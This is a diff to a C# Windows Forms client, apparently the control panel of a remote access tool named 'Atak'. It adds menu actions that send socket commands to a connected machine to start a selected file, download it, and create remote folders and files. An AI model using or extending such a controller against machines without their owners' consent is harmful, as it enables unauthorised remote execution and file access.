@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Microsoft.VisualBasic;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -54,6 +55,54 @@ namespace Atak
                 listBox1.Items.Clear();
                 listBox2.Items.Clear();
             }         
+        }
+
+        private void startToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listBox2.SelectedItem != null)
+            {
+                socket.Send(Encoding.UTF8.GetBytes("START|" + listBox2.SelectedItem.ToString()));
+            }
+            else
+            {
+                MessageBox.Show("Select item to start", "Atak", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            }
+        }
+
+        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listBox2.SelectedItem != null)
+            {
+                socket.Send(Encoding.UTF8.GetBytes("DOWN|" + listBox2.SelectedItem.ToString()));
+            }
+            else
+            {
+                MessageBox.Show("Select item to download", "Atak", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            }
+        }
+
+        private void createFolderToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            string folderName = Interaction.InputBox("New folder name to create", "Atak");
+            if (!string.IsNullOrEmpty(folderName))
+            {
+                socket.Send(Encoding.UTF8.GetBytes("CFOLDER|" + txtPath.Text + "\\" + folderName));
+                socket.Send(Encoding.UTF8.GetBytes("GETPATH|" + @txtPath.Text));
+                listBox1.Items.Clear();
+                listBox2.Items.Clear();
+            }           
+        }
+
+        private void createFileToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            string fileName = Interaction.InputBox("New file name to create ex:(file.txt)", "Atak");
+            if (!string.IsNullOrEmpty(fileName))
+            {
+                socket.Send(Encoding.UTF8.GetBytes("CFILE|" + txtPath.Text + "\\" + fileName));
+                socket.Send(Encoding.UTF8.GetBytes("GETPATH|" + @txtPath.Text));
+                listBox1.Items.Clear();
+                listBox2.Items.Clear();
+            }
         }
     }
 }
